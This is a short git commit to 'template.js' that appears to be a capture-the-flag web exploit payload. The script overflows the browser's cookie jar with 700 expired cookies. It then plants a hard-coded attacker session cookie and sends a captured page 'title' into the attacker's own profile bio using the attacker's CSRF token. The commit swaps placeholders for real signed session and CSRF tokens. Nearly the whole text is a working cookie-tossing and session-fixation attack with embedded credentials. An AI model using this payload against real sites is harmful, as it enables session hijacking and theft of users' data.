60f6f5d3f249eeead6733b06ca4a40a31bab21ba
qquang <vanhieuho200@gmail.com>
2022-09-07 14:44:05 +0700

    ok

--- template.js
+++ template.js
@@ -15,13 +15,13 @@ xhr.onreadystatechange = function() {
     for (let i = 0; i < 700; i++) {
         document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
     }
-    document.cookie = 'session=<my_session_cookie>;path=/';
+    document.cookie = 'session=eyJjc3JmX3Rva2VuIjoiMWQ1MzdmM2FiZTE2ZDhlNTYzOTRkNTdhYzQ1NzBiYzViYWUyYmY5ZCIsInVzZXIiOiJhc2QxMjM0NTYifQ.YxhKow.W8ObXWL_MynVbqCKQDLwu2kRh_o;path=/';
 
     //Update my bio with my csrf_token
     xhr_2 = new XMLHttpRequest();
     xhr_2.open('POST', '/api/user/update');
     xhr_2.withCredentials = true;
     xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr_2.send("bio=asdTitle:" + title + "&csrf_token=<my_csrf_token>");
+    xhr_2.send("bio=asdTitle:" + title + "&csrf_token=IjFkNTM3ZjNhYmUxNmQ4ZTU2Mzk0ZDU3YWM0NTcwYmM1YmFlMmJmOWQi.YxhKpQ.5ios6mVWvIhCU1wD8JQFsxeY7WU");
 }
 xhr.send();
